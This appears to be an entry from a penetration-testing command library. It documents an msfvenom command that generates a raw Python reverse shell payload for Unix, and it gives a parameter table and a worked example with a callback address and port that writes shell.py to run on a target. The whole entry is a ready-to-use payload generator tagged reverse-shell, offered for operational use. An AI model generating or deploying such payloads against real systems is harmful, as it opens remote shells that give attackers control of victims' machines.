---
id: ba5f3242-3f0c-414a-9050-85c6e4518840
name: msfvenom-generate-cmd-unix-reverse-python-raw
type: command
executor: bash
data: >-
  msfvenom -p cmd/unix/reverse_python LHOST="$_LHOST" LPORT="$_LPORT" -f raw >
  $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275595+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Unix
tags:
  - python
  - reverse-shell
verified: true
validated: true
---

# msfvenom-generate-cmd-unix-reverse-python-raw

## Command

```bash
msfvenom -p cmd/unix/reverse_python LHOST="$_LHOST" LPORT="$_LPORT" -f raw > $_OUTPUT_FILE
```

## Description

Generates a Python reverse shell script for Unix systems using msfvenom.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p cmd/unix/reverse_python | Unix Python reverse payload | Yes |
| LHOST="$_LHOST" | IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f raw | Raw script | Yes |
| > $_OUTPUT_FILE | Output (e.g., shell.py) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
```

## Expected Output

'shell.py' script. Run with python shell.py.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
